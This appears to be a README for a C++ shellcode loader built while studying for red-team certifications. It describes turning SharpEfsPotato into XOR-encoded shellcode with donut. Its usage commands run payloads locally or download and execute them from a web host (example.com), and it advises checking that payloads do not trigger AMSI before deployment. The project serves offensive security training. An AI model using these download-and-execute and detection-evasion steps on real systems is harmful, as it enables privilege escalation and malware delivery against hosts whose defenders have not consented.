A relatively simple shellcode loader in C++ that supports loading from http and also xor.
While prepping for the CRTP/CRTE I've been thinking about the tools that I use and how that I troubleshoot issues. I've realized most of the issues I run into stem from not understanding how these systems interact at a low level, and so I created this loader to broaden my understanding.

Requires donut:
https://github.com/TheWover/donut
```
pip install donut-shellcode
```

Usage:
Create your payload
```bash
python donutEncoder.py -i SharpEfsPotato.exe -b 1 --args='-p calc.exe' -e "HelloWorld"
```

Copy the file over and execute
```powershell
.\Loader.exe /p:payload.bin /e:HelloWorld
```

Or host the file on a web server and use the loader to download and execute
```powershell
.\Loader.exe /p:http://example.com/payload.bin /e:HelloWorld
```

Omit `-e` and `/e:` if not using the XOR encoding function.

Donut doesn't bypass amsi anymore (AMSI_Patch_T.B12), so I recommend making sure your payloads don't trigger it before sending them off. Add the flag `-b 1` to avoid your shellcode being created with the now non-functional amsi-bypass. 

Inspired by my teammate Mane:
https://github.com/manesec/shellcodeloader4mane
